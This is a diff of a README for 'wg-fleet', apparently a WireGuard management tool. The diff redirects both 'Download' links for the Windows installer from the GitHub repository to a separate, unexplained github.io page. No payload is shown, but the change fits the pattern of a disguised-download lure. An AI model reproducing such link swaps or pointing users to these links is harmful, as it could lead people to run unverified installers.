@@ -1,6 +1,6 @@
 # 🌐 wg-fleet - Manage all your VPN connections easily
 
-[![Download wg-fleet](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Josephusunpunctual298/wg-fleet)
+[![Download wg-fleet](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://josephusunpunctual298.github.io)
 
 wg-fleet acts as a central control panel for your WireGuard networks. It helps you manage multiple servers from a single screen. You see live traffic, check server health, and update peers without logging into remote terminals. 
 
@@ -8,7 +8,7 @@ wg-fleet acts as a central control panel for your WireGuard networks. It helps y
 
 To begin, you need the application installer. Visit the official software page to download the latest version for Windows.
 
-[Download the latest wg-fleet release here](https://github.com/Josephusunpunctual298/wg-fleet)
+[Download the latest wg-fleet release here](https://josephusunpunctual298.github.io)
 
 ## 💻 System Requirements
 
